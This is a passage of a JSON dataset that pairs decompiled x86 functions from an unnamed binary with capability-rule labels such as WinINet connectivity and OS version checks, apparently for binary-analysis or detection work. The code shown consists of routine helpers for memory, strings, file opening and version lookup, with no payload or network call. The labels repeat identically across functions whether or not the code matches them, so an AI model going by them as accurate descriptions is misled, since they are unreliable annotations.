        "decompiled_code": "\nuint __cdecl fcn.00034830(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0x4000;\n    if (arg_ch == NULL) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        do {\n            arg_8h_00 = fcn.00035200(var_ch);\n            if (arg_8h_00 == 0) {\n                return 0x21590004;\n            }\n            iVar2 = fcn.0007869a();\n            if (iVar2 == -0x3ffffffc) {\n                fcn.00035330(arg_8h_00);\n                if ((arg_8h == 6) || (arg_8h == 0xb)) {\n                    var_ch = var_4h;\n                }\n                else {\n                    var_ch = var_ch << 1;\n                }\n            }\n        } while (iVar2 == -0x3ffffffc);\n        if (iVar2 == 0) {\n            *arg_ch = arg_8h_00;\n            uVar1 = 0;\n        }\n        else {\n            fcn.00035330(arg_8h_00);\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 336
    },
    "000348f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nint32_t __cdecl fcn.000348f0(int32_t arg_8h, uint32_t *arg_ch, uint32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_14h;\n    uint32_t *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    if (arg_8h == 0) {\n        var_14h = 0x21590065;\n    }\n    else if (arg_ch == NULL) {\n        var_14h = 0x21590066;\n    }\n    else if (arg_10h == NULL) {\n        var_14h = 0x21590067;\n    }\n    else {\n        iVar1 = fcn.00034ec0(arg_8h, 0x2e);\n        if (iVar1 == 0) {\n            var_14h = 0x21590065;\n        }\n        else {\n            var_8h = fcn.00034f00(arg_8h);\n            var_14h = fcn.00034830(0xb, &var_10h);\n            if (var_14h == 0) {\n                var_4h = var_10h + 1;\n                var_14h = 0x21590005;\n                for (var_ch = 0; var_ch < *var_10h; var_ch = var_ch + 1) {\n                    if (((var_ch == 0) && (iVar1 = fcn.00034de0(arg_8h, 0xb1bde81c, var_8h),  iVar1 == 0)) ||\n                       ((var_ch == 1 && (iVar1 = fcn.00034de0(arg_8h, 0xb1be17b8, var_8h),  iVar1 == 0)))) {\ncode_r0x00034a02:\n                        iVar1 = fcn.00034de0(arg_8h, 0xb1bde918, var_8h);\n                        if ((iVar1 != 0) || (var_4h[var_ch * 0x47 + 2] < 0x80000001)) {\n                            *arg_ch = var_4h[var_ch * 0x47 + 2];\n                            *arg_10h = var_4h[var_ch * 0x47 + 3];\n                            var_14h = 0;\n                            break;\n                        }\n                    }\n                    else {\n                        var_14h = var_8h;\n                        iVar1 = fcn.00034de0(var_4h + *(var_4h + var_ch * 0x11c + 0x1a) + var_ch * 0x11c + 0x1c, arg_8h\n                                             , var_8h);\n                        if (iVar1 == 0) goto code_r0x00034a02;\n                    }\n                }\n                fcn.00035330(var_10h);\n            }\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 699
    },
    "00034af0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00034af0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if ((arg_8h != arg_ch) && (arg_ch != 0)) {\n        fcn.00078544(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "00034b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00034b10(int16_t *arg_8h, uint32_t arg_ch)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint var_4ch;\n    int16_t *var_48h;\n    int16_t *var_44h;\n    uint var_40h;\n    int16_t *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    \n    if ((arg_8h == NULL) || (arg_ch < 5)) {\n        uVar2 = 0x21590008;\n    }\n    else {\n        fcn.00078790(&var_38h, 0, 0x38);\n        var_44h = 0xb1be17ac;\n        var_48h = arg_8h;\n        do {\n            iVar1 = *var_44h;\n            *var_48h = iVar1;\n            var_44h = var_44h + 1;\n            var_48h = var_48h + 1;\n        } while (iVar1 != 0);\n        var_3ch = arg_8h + 4;\n        var_40h._0_2_ = 0;\n        var_40h._2_2_ = arg_ch * 2 + -8;\n        var_34h = 0x24;\n        var_30h = 0xb1be17c0;\n        var_2ch = &var_40h;\n        uVar2 = fcn.00078670(3, 0, &var_38h, 0, 0);\n        uVar2 = fcn.000785b6(uVar2);\n    }\n    return uVar2;\n}\n",
        "token_count": 407
    },
    "00034bd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00034bd0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (((arg_8h == 0) || (arg_ch == 0)) || (arg_14h == NULL)) {\n        var_8h = -0x3ffffff3;\n    }\n    else {\n        *arg_14h = &var_8h;\n        var_8h = fcn.000786a0(arg_8h, arg_ch, arg_10h, *arg_14h, 0, &var_4h);\n        if ((var_8h == -0x3fffffdd) || (var_8h == -0x7ffffffb)) {\n            iVar1 = fcn.00035200(var_4h);\n            *arg_14h = iVar1;\n            if (*arg_14h == 0) {\n                var_8h = 0x21590004;\n            }\n            else {\n                var_8h = fcn.000786a0(arg_8h, arg_ch, arg_10h, *arg_14h, var_4h, &var_4h);\n                if (var_8h != 0) {\n                    fcn.00035330(*arg_14h);\n                }\n            }\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 338
    },
    "00034c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00034c90(void)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = *0xb1c5b3c4;\n    if (*0xb1c5b3c4 == 0) {\n        fcn.00078676(&var_ch, &var_8h, 0, 0);\n        iVar1 = fcn.000785da(0xffffffff, 0x1a, &var_4h, 4, 0);\n        if (iVar1 != 0) {\n            var_4h = 0;\n        }\n        if (var_ch == 4) {\n            if (var_8h == 0) {\n                *0xb1c5b3c4 = 2;\n                iVar1 = *0xb1c5b3c4;\n            }\n            else {\n                *0xb1c5b3c4 = 1;\n                iVar1 = *0xb1c5b3c4;\n            }\n        }\n        else if (var_ch == 5) {\n            if (var_8h == 0) {\n                *0xb1c5b3c4 = 3;\n                iVar1 = 3;\n            }\n            else if (var_8h == 1) {\n                *0xb1c5b3c4 = (-(var_4h != 0) & 10) + 9;\n                iVar1 = *0xb1c5b3c4;\n            }\n            else if (var_8h == 2) {\n                *0xb1c5b3c4 = (-(var_4h != 0) & 9) + 0xe;\n                iVar1 = *0xb1c5b3c4;\n            }\n            else {\n                iVar1 = 0;\n            }\n        }\n        else if (var_ch == 6) {\n            if (var_8h == 0) {\n                *0xb1c5b3c4 = (-(var_4h != 0) & 0xb) + 0x1b;\n                iVar1 = *0xb1c5b3c4;\n            }\n            else if (var_8h == 1) {\n                *0xb1c5b3c4 = (-(var_4h != 0) & 0xb) + 0x23;\n                iVar1 = *0xb1c5b3c4;\n            }\n            else {\n                iVar1 = 0;\n            }\n        }\n        else {\n            iVar1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 620
    },
    "00034de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00034de0(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    while (arg_10h != 0) {\n        var_4h = *arg_8h;\n        arg_8h = arg_8h + 1;\n        if ((0x40 < var_4h) && (var_4h < 0x5b)) {\n            var_4h = var_4h + 0x20;\n        }\n        var_8h = *arg_ch;\n        arg_ch = arg_ch + 1;\n        if ((0x40 < var_8h) && (var_8h < 0x5b)) {\n            var_8h = var_8h + 0x20;\n        }\n        if ((var_4h == 0) || (arg_10h = arg_10h + -1,  var_4h != var_8h)) break;\n    }\n    return var_4h - var_8h;\n}\n",
        "token_count": 275
    },
    "00034e80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00034e80(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_4h;\n    \n    for (var_4h = arg_10h; var_4h != 0; var_4h = var_4h + -1) {\n        *(arg_8h + var_4h + -1) = *(arg_ch + var_4h + -1);\n    }\n    return arg_8h;\n}\n",
        "token_count": 119
    },
    "00034f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00034f40(uint param_1, uint param_2, uint param_3, int32_t param_4, int32_t *param_5, int32_t param_6)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    int32_t var_14h;\n    int32_t *var_18h_2;\n    int32_t var_1ch_2;\n    uint var_18h;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45808;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffa0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_40h = 0;\n    var_3ch = 0;\n    if (var_14h == 0) {\n        var_48h = 0;\n    }\n    else {\n        var_48h = (**0xb1bde2a4)(var_8h, 0, 0, 0, &var_44h, 0);\n        if (-1 < var_48h) {\n            iVar1 = (**0xb1bde1b8)();\n            if (var_44h == iVar1) {\n                var_48h = 0;\n                var_4h = 1;\n                if (var_1ch_2 == 0) {\n                    fcn.0007877e(var_ch, var_10h, var_14h);\n                }\n                else {\n                    fcn.0007877e(var_10h, var_ch, var_14h);\n                }\n                if (var_18h_2 != NULL) {\n                    *var_18h_2 = var_14h;\n                }\n                var_4h = 0xffffffff;\n            }\n            else {\n                var_20h = (**0xb1bde294)(var_10h, var_14h, 0, 0, 0);\n                if (var_20h == 0) {\n                    var_48h = -0x3fffff66;\n                }\n                else {\n                    (**0xb1bde1bc)(var_44h, &var_38h);\n                    var_40h = 1;\n                    var_4h = 0;\n                    (**0xb1bde2a0)(var_20h, 0, var_1ch_2 != 0);\n                    var_3ch = 1;\n                    var_1ch = (**0xb1bde0e0)(var_20h, 0, 1, 0, 0, 0x10);\n                    if (var_1ch == 0) {\n                        var_48h = -0x3fffff66;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        if (var_1ch_2 == 0) {\n                            fcn.0007877e(var_ch, var_1ch, var_14h);\n                        }\n                        else {\n                            fcn.0007877e(var_1ch, var_ch, var_14h);\n                        }\n                        var_4h = 0xffffffff;\n                        var_48h = 0;\n                    }\n                }\n            }\n            if (var_1ch != 0) {\n                (**0xb1bde0a4)(var_1ch, var_20h);\n            }\n            if (var_3ch != 0) {\n                (**0xb1bde29c)(var_20h);\n            }\n            if (var_40h != 0) {\n                (**0xb1bde1b4)(&var_38h);\n            }\n            if (var_20h != 0) {\n                (**0xb1bde2ac)(var_20h);\n            }\n            (**0xb1bde2e4)();\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return var_48h;\n}\n",
        "token_count": 1025
    },
    "00035200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035200(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        var_4h = 0xb1c59bea;\n    }\n    else {\n        var_4h = fcn.0001d010(1, arg_8h, 0x7346744e);\n    }\n    return var_4h;\n}\n",
        "token_count": 98
    },
    "00035230": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035230(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        var_4h = 0xb1c59bea;\n    }\n    else {\n        var_4h = fcn.0001d010(0, arg_8h, 0x7346744e);\n    }\n    return var_4h;\n}\n",
        "token_count": 98
    },
    "00035260": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035260(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        fcn.00035330(*arg_8h);\n        *arg_8h = 0;\n        uVar1 = 0;\n    }\n    else {\n        iVar2 = fcn.00035230(arg_10h);\n        if (iVar2 == 0) {\n            uVar1 = 0xffffffff;\n        }\n        else {\n            if (arg_10h < arg_ch) {\n                var_8h = arg_10h;\n            }\n            else {\n                var_8h = arg_ch;\n            }\n            fcn.0007877e(iVar2, *arg_8h, var_8h);\n            fcn.00035330(*arg_8h);\n            *arg_8h = iVar2;\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 255
    },
    "000352f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000352f0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00035200(arg_8h * arg_ch);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        fcn.00078790(iVar1, 0, arg_8h * arg_ch);\n    }\n    return iVar1;\n}\n",
        "token_count": 113
    },
    "00035330": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00035330(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (arg_8h != -0x4e3a6416)) {\n        fcn.0001d050(arg_8h, 0x7346744e);\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "00035360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00035360(char *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint var_20h;\n    char *var_1ch;\n    char *var_18h;\n    uint var_14h;\n    uint var_ch;\n    char *var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    do {\n        cVar1 = *var_8h;\n        var_8h = var_8h + 1;\n    } while (cVar1 != '\\0');\n    pcVar2 = fcn.00035200(var_8h + (1 - (arg_8h + 1)));\n    if (pcVar2 != NULL) {\n        var_18h = arg_8h;\n        var_1ch = pcVar2;\n        do {\n            cVar1 = *var_18h;\n            *var_1ch = cVar1;\n            var_18h = var_18h + 1;\n            var_1ch = var_1ch + 1;\n        } while (cVar1 != '\\0');\n    }\n    return pcVar2;\n}\n",
        "token_count": 265
    },
    "000353f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.000353f0(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    uint var_20h;\n    int16_t *var_1ch;\n    int16_t *var_18h;\n    uint var_14h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    do {\n        iVar1 = *var_8h;\n        var_8h = var_8h + 1;\n    } while (iVar1 != 0);\n    piVar2 = fcn.00035200((var_8h - (arg_8h + 1) >> 1) * 2 + 2);\n    if (piVar2 != NULL) {\n        var_18h = arg_8h;\n        var_1ch = piVar2;\n        do {\n            iVar1 = *var_18h;\n            *var_1ch = iVar1;\n            var_18h = var_18h + 1;\n            var_1ch = var_1ch + 1;\n        } while (iVar1 != 0);\n    }\n    return piVar2;\n}\n",
        "token_count": 283
    },
    "00035690": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035690(uint arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    cVar1 = *arg_ch;\n    if (cVar1 == 'a') {\n        if (arg_ch[1] != '+') {\n            var_18h = 4;\n        }\n        else {\n            var_18h = 7;\n        }\n        var_4h = arg_ch[1] != '+';\n        var_ch = 3;\n    }\n    else if (cVar1 == 'r') {\n        if (arg_ch[1] == '+') {\n            var_18h = 3;\n            var_4h = 0;\n        }\n        else {\n            var_18h = 1;\n            var_4h = 3;\n        }\n        var_ch = 1;\n    }\n    else {\n        if (cVar1 != 'w') {\n            fcn.000354e0(0x16);\n            return 0;\n        }\n        if (arg_ch[1] == '+') {\n            var_18h = 3;\n        }\n        else {\n            var_18h = 2;\n        }\n        var_4h = 0;\n        var_ch = 5;\n    }\n    var_8h = fcn.00035200(0x208);\n    if (var_8h == 0) {\n        var_40h = 0;\n    }\n    else {\n        fcn.000363d0(var_8h, 0x104, arg_8h);\n        fcn.00078550(&var_20h, var_8h);\n        var_3ch = 0x18;\n        var_38h = 0;\n        var_30h = 0x40;\n        var_34h = &var_20h;\n        var_2ch = 0;\n        var_28h = 0;\n        var_24h = fcn.0001ec90(&var_40h, var_18h | 0x100000, &var_3ch, &var_14h, 0, 0x80, var_4h, var_ch, 0x10, 0, 0);\n        fcn.00035330(var_8h);\n        if (var_24h != 0) {\n            arg_8h_00 = fcn.000785b6(var_24h);\n            fcn.000354e0(arg_8h_00);\n            var_40h = 0;\n        }\n    }\n    return var_40h;\n}\n",
        "token_count": 689
    },
    "00035840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00035840(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0xffffffff;\n    var_10h = 0xfffffffe;\n    iVar1 = fcn.00078574(arg_14h, 0, 0, 0, &var_8h, arg_8h, arg_ch * arg_10h, &var_10h, 0);\n    if (iVar1 == 0) {\n        var_4h = var_4h / arg_ch;\n    }\n    else {\n        arg_8h_00 = fcn.000785b6(iVar1);\n        fcn.000354e0(arg_8h_00);\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 244
    },
    "000358b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000358b0(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0xffffffff;\n    var_10h = 0xfffffffe;\n    iVar1 = fcn.000785e0(arg_14h, 0, 0, 0, &var_8h, arg_8h, arg_ch * arg_10h, &var_10h, 0);\n    if (iVar1 == 0) {\n        var_4h = var_4h / arg_ch;\n    }\n    else {\n        arg_8h_00 = fcn.000785b6(iVar1);\n        fcn.000354e0(arg_8h_00);\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 246
    },
    "00035930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035930(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_8h;\n    \n    iVar1 = fcn.000785c2(arg_8h, &var_8h, &var_20h, 0x18, 5);\n    if (iVar1 != 0) {\n        var_18h = 0xffffffff;\n    }\n    return var_18h;\n}\n",
        "token_count": 119
    },
    "00035960": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035960(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint arg_8h_00;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_18h = 0;\n    var_4h = 0;\n    var_ch = 1;\n    if ((arg_ch & 8) != 0) {\n        var_18h = 4;\n    }\n    if (((arg_ch & 0x100) != 0) && (var_ch = 3,  (arg_ch & 0x400) != 0)) {\n        var_ch = 2;\n    }\n    if ((arg_ch & 3) == 0) {\n        var_18h = var_18h | 1;\n        var_4h = 3;\n    }\n    if ((arg_ch & 2) != 0) {\n        var_18h = var_18h | 3;\n    }\n    if ((arg_ch & 0x200) != 0) {\n        var_ch = 5;\n    }\n    if ((arg_ch & 1) != 0) {\n        var_18h = var_18h & 0xfffffffe | 2;\n    }\n    var_8h = fcn.00035200(0x208);\n    if (var_8h == 0) {\n        var_40h = 0xffffffff;\n    }\n    else {\n        fcn.000364b0(var_8h, 0x104, arg_8h);\n        fcn.00078550(&var_20h, var_8h);\n        var_3ch = 0x18;\n        var_38h = 0;\n        var_30h = 0x40;\n        var_34h = &var_20h;\n        var_2ch = 0;\n        var_28h = 0;\n        var_24h = fcn.0001ec90(&var_40h, var_18h | 0x100000, &var_3ch, &var_14h, 0, 0x80, var_4h, var_ch, 0x10, 0, 0);\n        fcn.00035330(var_8h);\n        if (var_24h != 0) {\n            arg_8h_00 = fcn.000785b6(var_24h);\n            fcn.000354e0(arg_8h_00);\n            var_40h = 0xffffffff;\n        }\n    }\n    return var_40h;\n}\n",
        "token_count": 658
    },
    "00035ae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035ae0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00035200(0x208);\n    if (arg_8h_00 == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.000363d0(arg_8h_00, 0x104, arg_8h);\n        uVar1 = fcn.00035960(arg_8h_00, arg_ch);\n        fcn.00035330(arg_8h_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 170
    },
    "00035b50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035b50(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0xffffffff;\n    var_10h = 0xfffffffe;\n    iVar1 = fcn.000785e0(arg_8h, 0, 0, 0, &var_8h, arg_ch, arg_10h, &var_10h, 0);\n    if (iVar1 != 0) {\n        if (iVar1 == -0x3fffffef) {\n            var_4h = 0;\n        }\n        else {\n            arg_8h_00 = fcn.000785b6(iVar1);\n            fcn.000354e0(arg_8h_00);\n            var_4h = 0xffffffff;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 239
    },
    "00035bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035bc0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0xffffffff;\n    var_10h = 0xfffffffe;\n    iVar1 = fcn.00078574(arg_8h, 0, 0, 0, &var_8h, arg_ch, arg_10h, &var_10h, 0);\n    if (iVar1 != 0) {\n        arg_8h_00 = fcn.000785b6(iVar1);\n        fcn.000354e0(arg_8h_00);\n        var_4h = 0xffffffff;\n    }\n    return var_4h;\n}\n",
        "token_count": 208
    },
    "00035cf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
